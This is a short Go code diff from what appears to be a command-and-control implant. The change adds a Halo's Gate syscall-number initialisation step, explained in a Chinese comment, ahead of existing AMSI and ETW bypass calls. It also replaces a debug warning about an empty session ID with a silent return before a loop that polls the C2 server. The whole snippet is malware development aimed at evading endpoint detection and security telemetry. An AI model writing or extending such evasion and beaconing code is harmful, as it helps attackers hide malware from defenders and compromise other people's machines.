@@ -43,6 +43,9 @@ func normalInit() {
 func main() {
 	normalInit()
 
+	// ===== Halo's Gate: 初始化SSN映射表 (必须在所有syscall之前) =====
+	evasion.InitSSNMap()
+
 	// ===== EDR Evasion: AMSI + ETW Patch =====
 	evasion.BypassAMSI()
 	evasion.BypassETW()
@@ -91,7 +94,7 @@ func main() {
 		time.Sleep(tp.GetInterval())
 	}
 	if sessionID == "" {
-		fmt.Fprintf(os.Stderr, "[DBG] WARNING: sessionID is empty after init!\n")
+		return
 	}
 
 	// 主循环: 随机间隔轮询C2
